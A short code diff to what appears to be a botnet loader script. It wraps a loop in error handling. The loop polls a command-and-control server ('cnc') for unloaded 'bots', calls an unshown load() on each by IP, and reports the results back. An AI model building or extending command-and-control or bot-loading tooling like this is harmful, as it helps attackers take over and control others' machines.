@@ -102,13 +102,16 @@ def load(system):
 
 
 while(1):
-    time.sleep(10)
-    logger.info("querying DB...")
-    systems = list(requests.get(url = cnc+"/getbotunset").json().values())
-    for system in systems:
-        # logger.info(system)
-        directoryName = load(system)
-        requests.get(url=cnc+"/setloaded/"+system["ip"])
-        requests.post(url=cnc+"/storeDirectory/"+system["ip"],json={"directoryName":directoryName})
-        logger.info("Loaded "+system["ip"])
+    try:
+        time.sleep(10)
+        logger.info("querying DB...")
+        systems = list(requests.get(url = cnc+"/getbotunset").json().values())
+        for system in systems:
+            logger.info("Loading "+system["ip"])
+            directoryName = load(system)
+            requests.get(url=cnc+"/setloaded/"+system["ip"])
+            requests.post(url=cnc+"/storeDirectory/"+system["ip"],json={"directoryName":directoryName})
+            logger.info("Loaded "+system["ip"])
+    except:
+        logger.info("An error occurred in loader")
 
